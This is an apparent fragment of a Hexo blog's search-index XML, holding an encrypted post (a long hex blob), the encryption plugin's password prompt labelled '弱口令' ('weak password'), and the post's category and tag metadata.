983dabf875a28b9e3042511a19fa514710d9a6cdaffcacaa28789aebc43eccf7310544ddd24f7deeb27c1bcd47dac46791c4460e2b1c229d9997ac14ca78d239be5b9b673bed34b508d7af9446b06677260b3db3bc7ff33b8d503d7b66307b4a6a85cc0942b6d5fdc4286cf8c04e2411b9c581cc38a98b77c7ff6491dfc44ded0e3c031054a35b3b3eca526ed55cdcc82bda2ac9272b26e5f4bf2fbaf5b03f62ab9ae924262a13d0fc9b300733cd49fd9ec268b0dfbd68da4ba9876489f6f6183e255a84122546bb1881d2907dd7f97aedea546cb632e783e651d9c70e341c26da033a074a1ac32bd2ace163af9f46806b3c27e32869b2639638dc8ce224fe46bd726d3c1f93acbafbcc4097fd08a65da808cf13733511c90bbad7e1f14fbfff48e24b0ab492169161c581fda99b455ef109eeca84d0416b55975340aa51306dbfcc6e5a49ad34a47942624135a7947cb3d371f80ed7d186cff575ce7751b933ed9f526a91b2fd9de95a94720bb6efcded50bfdef85fa104a99445a4607df38e5755a357ab8f70b54d17ec04ea05c46db04e40051b028ab20db4c1f8e936664ea5763191659a349ce6fede00a9a6aa464046546c452c8d350ac10d6dc7159c87873169474437b69f8a0336ef9dbc2b42f2c4570280a7caf9cf443aa9c8f756ba945df822974c40deb146226803ccea5e632281aa3918932fcff1e33048254278b28823dd4e32306d06ba64b2ef3d72af02e6d915a51b69b90f8d75317c1641e605a51194e0c93ef450c97269c8ea3621e923c6ba39acfa7d02dd195b4cbd2881f5e5bab555319e6ef7b2c478f67a57f77f934441411111a224f8996068dee9f7d93f6605c157458dd1f5949ae89ca23bf3c06e8a3f2dfa2d841528d3f8d0072823a4ff49cd6de40ecfb2943e4d9a0701d9ad63615bb7016677364d3d5ff667d84d839ac0bc87d10e0e586bc0d1930dcee0482df1197199aedb558f96083d79da3581f8ca36a7e1efdcf5123b936062d4428147b0f61223251d14066cf10d9928fade8fab51cb070af64fd62572c8c424a0b04edd4e08b19008032ec8b007bba4dd8857c2b8bfa15b5343240548d9d34072390b197fb94e9ebc4808cbb39c9ba41737d4ba02705eb38359d7d84058a4029f1dff39da6e5f728799fd075c211d1aab909b0f19a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">弱口令</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>技术分享</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
